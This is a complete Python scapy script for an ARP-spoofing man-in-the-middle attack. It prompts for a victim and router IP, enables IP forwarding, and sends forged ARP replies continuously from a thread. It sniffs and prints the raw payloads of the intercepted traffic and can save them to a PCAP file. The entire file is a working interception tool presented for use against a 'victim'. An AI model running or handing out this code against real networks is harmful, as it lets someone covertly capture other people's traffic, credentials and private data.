import os
import time
import sys
import threading
from scapy.all import *

def get_info():
    print("~~~ [1] Initializing Config...")
    interface = input("Enter Interface (e.g., eth0): ")
    victim_ip = input("Enter Victim IP: ")
    router_ip = input("Enter Router IP: ")
    log_pcap = input("Log traffic to PCAP file? (y/n): ").lower() == 'y'
    return {
        "iface": interface, 
        "v_ip": victim_ip, 
        "r_ip": router_ip, 
        "log": log_pcap
    }

def set_ip_forwarding(toggle):
    state = "1" if toggle else "0"
    if sys.platform == "darwin":
        os.system(f'sysctl -w net.inet.ip.forwarding={state}')
    else:
        os.system(f'echo {state} > /proc/sys/net/ipv4/ip_forward')
    print(f"~~~ [2] IP Forwarding {'Enabled' if toggle else 'Disabled'}")

def get_mac(ip, interface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                 timeout=2, iface=interface, inter=0.1, verbose=False)
    for _, receive in ans:
        return receive.sprintf(r"%Ether.src%")
    return None

def spoof_thread(v_ip, v_mac, r_ip, r_mac, stop_event):
    while not stop_event.is_set():
        send(ARP(op=2, pdst=v_ip, psrc=r_ip, hwdst=v_mac), verbose=False)
        send(ARP(op=2, pdst=r_ip, psrc=v_ip, hwdst=r_mac), verbose=False)
        time.sleep(2)

def restore_network(v_ip, v_mac, r_ip, r_mac, interface):
    print("\n~~~ [!] Stopping...")
    send(ARP(op=2, pdst=r_ip, psrc=v_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=v_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=v_ip, psrc=r_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=r_mac), count=5, verbose=False)
    set_ip_forwarding(False)

captured_packets = []

def sniff_callback(packet, log_enabled):
    if packet.haslayer(IP):
        if log_enabled:
            captured_packets.append(packet)
            
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            print(f"[*] {packet[IP].src} -> {packet[IP].dst} | Data: {payload[:50]}")

def mitm():
    conf = get_info()
    if os.geteuid() != 0:
        print("~!~ Error: Run as root (sudo).")
        sys.exit(1)

    print("~~~ [3] Resolving MAC addresses...")
    v_mac = get_mac(conf["v_ip"], conf["iface"])
    r_mac = get_mac(conf["r_ip"], conf["iface"])
    
    if not v_mac or not r_mac:
        print("~!~ Error: Resolution failed.")
        sys.exit(1)

    set_ip_forwarding(True)
    stop_spoofing = threading.Event()
    spoof_worker = threading.Thread(target=spoof_thread, args=(conf["v_ip"], v_mac, conf["r_ip"], r_mac, stop_spoofing))
    
    try:
        spoof_worker.start()
        print(f"~~~ [4] MITM Active. Sniffing on {conf['iface']}...")

        sniff(iface=conf["iface"], prn=lambda pkt: sniff_callback(pkt, conf["log"]), store=0)
        
    except KeyboardInterrupt:
        stop_spoofing.set()
        spoof_worker.join()
        
        if conf["log"] and captured_packets:
            filename = f"mitm_capture_{int(time.time())}.pcap"
            print(f"~~~ [*] Saving {len(captured_packets)} packets to {filename}...")
            wrpcap(filename, captured_packets)
            
        restore_network(conf["v_ip"], v_mac, conf["r_ip"], r_mac, conf["iface"])
        print("~~~ [5] Clean Exit Successful.")

mitm()
